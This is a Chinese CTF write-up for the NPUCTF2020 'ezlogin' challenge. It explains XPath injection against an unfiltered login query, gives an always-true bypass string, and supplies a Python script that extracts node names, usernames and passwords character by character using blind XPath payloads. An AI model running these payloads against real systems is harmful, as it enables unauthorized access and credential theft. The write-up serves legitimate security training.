# [NPUCTF2020]ezlogin

## 知识点

`xpath盲注`

## 解题

在xpath中的查询语句为：

```
"/root/users/user[username/text()='".$name."' and password/text()='".$pwd."']";
```

其中$name和$pwd是我们输入的字符，这里对字符没有经过任何的过滤。

当$name= `admin‘ or 1=1 or ''='`

拼接后的语句为：

```
"/root/users/user[username/text()='admin' or 1=1 or ''='' and password/text()='".$pwd."']";   //成为永真使，万能密码
```

 值得注意的是在xpath的查询语句中没有注释。

```python
import requests
import re
import time

session = requests.session()
url = "http://e6bcddf2-8f0b-411a-ba79-90a1b4820660.node3.buuoj.cn"
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
head = {
    #'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
    'Content-Type': 'application/xml',
    #"Cookie":"UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c"
        }

find = re.compile(r'<input type="hidden" id="token" value="(.*?)" />',re.S)
result = ""
#猜测根节点名称
payload_1 = "<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>"
#猜测子节点名称
payload_2 = "<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>"
#猜测accounts的节点
payload_3 ="<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>"
#猜测user节点
payload_4 ="<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>"
#跑用户名和密码
payload_username ="<username>'or substring(/root/accounts/user[2]/username/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>"
payload_password ="<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>"

def get_token():     #获取token的函数
    resp = session.get(url=url)  #如果在这里用headers会得到超时的界面
    token = find.findall(resp.text)[0]
    #print(token)
    return token

for x in range(1,100):
    for char in chars:
        time.sleep(0.3)
        token = get_token()
        playload = payload_1.format(x, char, token)   #根据上面的playload来改
        #print(playload)
        resp = session.post(url=url,headers=head, data=playload)
        #print(resp.text)
        if "非法操作" in resp.text:
            result += char
            print(result)
            break
    if "用户名或密码错误" in resp.text:
        break

print(result)
```

